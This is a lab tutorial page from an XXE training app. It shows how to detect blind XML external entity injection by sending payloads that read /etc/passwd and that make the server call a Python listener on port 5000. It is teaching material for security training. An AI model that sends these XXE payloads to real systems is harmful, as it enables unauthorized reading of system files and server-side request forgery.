---
title: "Identifying Blind XXE"
weight: 5
---

{{% notice note %}}
Make sure you are on the Blind XXE (`/blind-xxe.do`) page of the XXE Firing Range app
{{% /notice %}}

As we saw in the last exercise the following would show the contents of the `/etc/passwd` file. In this exercise it will not work. If we submit the same info as before we get back something different:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<todo>&xxe;</todo>
```

Unfortunately we are not able to see the contents of the file. Instead we are given an error. The error states that the XML parser was expecting to find a couple of tags that it did not find. The good news is that it seems to still successfully parse the XML we provided.

![Malformed XML](/static/img/malformed_xml_both.png)

We can check that by modifying our XML a bit to see if we can clear one of the two errors found:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<todo>
  <description>test</description>
  <b>&xxe;</b>
</todo>
```

This time we see that we do not receive the same error back which tells us that the XML is being processed successfully, but just not showing us the results.

![Malformed XML Category](/static/img/malformed_xml_category.png)

If we try and send XML that is purposely malformed we see that we get back a generic error message. In this XML we do not close the `description` tag.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<todo>
  <description>test
  <b>&xxe;</b>
</todo>
```

And the results are show that the description tag is not closed.

![Malformed XML Unknown](/static/img/malformed_xml_no_description_end_tag.png)

So, we are unable to view the content directly like we did in the Basic XXE exercise. But, we may be able to send the data to a system we control. First, lets setup a generic python webserver on the XXE machine.

First login to the XXE VM by running the following:

```bash
vagrant ssh
```

Change directories to the `dtds` directory (we will use these dtds later on).

```bash
cd /home/vagrant/dtds
```

Then launch a simple python webserver running on port 5000 by running the following within the VM:

``` bash
python3 -m http.server 5000
```

We can see that the server is up and ready for connections.

![Python Webserver](/static/img/python_webserver.png)

Now lets try and get our TODOs site to send a request to the python webserver

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:5000/">
]>

<todo>&xxe;</todo>
```

Notice how we changed it from `file:/` to `http:`. Once we send that we get an error from the web app:

![Malformed XML Unknown](/static/img/scanner_state_not_recognized.png)

But we also notice that a request was performed on our python webserver:

![Python Webserver Request](/static/img/python_webserver_request.png)

So now we need to figure out how do we do two things:

1. Read the contents of the file
2. Request content from our webserver
